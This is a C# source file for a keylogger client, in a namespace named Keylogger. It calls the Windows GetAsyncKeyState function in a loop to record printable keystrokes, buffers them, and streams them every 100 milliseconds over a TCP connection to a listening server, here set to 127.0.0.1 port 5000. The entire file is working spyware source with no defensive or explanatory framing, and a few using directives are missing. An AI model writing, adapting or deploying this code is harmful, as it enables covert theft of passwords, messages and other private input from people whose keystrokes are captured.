using System;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;

namespace Keylogger
{
    class Client
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static async Task Main()
        {
            TcpClient client = new TcpClient("127.0.0.1", 5000);
            NetworkStream stream = client.GetStream();

            StringBuilder keyBuffer = new StringBuilder();
            DateTime lastSend = DateTime.Now;

            byte[] handshake = Encoding.UTF8.GetBytes("client");
            await stream.WriteAsync(handshake, 0, handshake.Length);

            while (true)
            {
                Thread.Sleep(5);

                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == -32767)
                    {
                        char keyChar = (char)i;
                        Console.Write(keyChar + ", ");
                        keyBuffer.Append(keyChar);
                    }
                }

                if ((DateTime.Now - lastSend).TotalMilliseconds >= 100 && keyBuffer.Length > 0)
                {
                    string message = keyBuffer.ToString();
                    byte[] data = Encoding.UTF8.GetBytes(message);
                    stream.Write(data, 0, data.Length);
                    keyBuffer.Clear();
                    lastSend = DateTime.Now;
                }
            }

            stream.Close();
            client.Close();
        }
    }
}

